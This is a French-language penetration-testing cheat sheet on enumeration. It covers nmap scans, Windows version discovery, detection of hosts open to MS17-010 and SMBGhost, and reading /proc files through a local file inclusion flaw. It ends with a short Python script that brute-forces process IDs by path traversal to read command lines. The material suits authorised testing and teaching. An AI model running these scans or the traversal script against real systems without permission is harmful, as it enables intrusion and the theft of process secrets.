# Enumération

## Enumération des machines + services (nmap)

* Scan rapide des 1000 ports les plus communs sur un intervalle d'adresses IP :

```
nmap --max-retries 1 -T4 -sS --open -oX nmapSimple_<IP>.xml -oN nmapSimple_<IP>.txt <IP>/<MASK>
```

* Scan des versions sur les 1000 ports les plus communs d'un intervalle d'adresses IP :

```
nmap -sV --open <IP>/<MASK>
```

* Scan UDP des versions sur les 1000 ports les plus communs d'un intervalle d'adresses IP :

```
nmap -sU -sV --open <IP>/<MASK>
```

* Utiliser un script :

```
nmap --script <SCRIPT> -p <PORT> <IP>/<MASK>
```

### TIPS (nmap)

* Utiliser l'option `-Pn` de `nmap` pour les scans sur les machines Windows.
* Utiliser l'option `-p-` de `nmap` pour scanner tous les ports.

## Enumération des versions d'OS Windows

```
cme smb <IP>/<MASK>
```

```
RunFinger.py -i <IP>/<MASK>
```

**Note :** _Le lien suivant indique si une version est maintenue ou pas : https://docs.microsoft.com/fr-fr/windows/release-health/release-information_

## Enumération des machines vulnérables à MS17-010

_RCE à cause d'une faille du protocole SMBv1_

```
nmap -v -p 445 --script smb-vuln-ms17-010.nse -Pn -oN nmap_scan_ms17-010_<IP>.txt <IP>/<MASK>
```

```
msfconsole (auxiliary/scanner/smb/smb_ms17_010)
```

## Enumération des machines vulnérables à Bleed et Ghost

```
nmap -p 445 --script cve-2020-0796 -Pn -oN nmap_scan_smbBleed_Ghost_<IP>.txt <IP>/<MASK>
```

## Enumération des services _via_ une LFI (Linux)

Dans le répertoire `/proc` chaque processus possèdes un répertoire. Dans celui-ci, il est possible de récupérer des informations sur les services en cours d'exécution.

* Service en écoute sur la machine :

```
/proc/net/tcp
/proc/net/tcp6 
```

* Information sur un processus en particulier :

```
/proc/<PID>/environ
```

* Commande ayant était exécutée pour lancer un processus :

```
/proc/<PID>/cmdline
```

#### Script d'énumération

```
import requests

for i in range (0,10000):
	x = requests.get('http://domain.com?param=/../proc/' + str(i) + '/cmdline')
	if len(x.content) >= 158:
		print(i)
	if i%100 == 0:
		print(str(i) + '%')
```
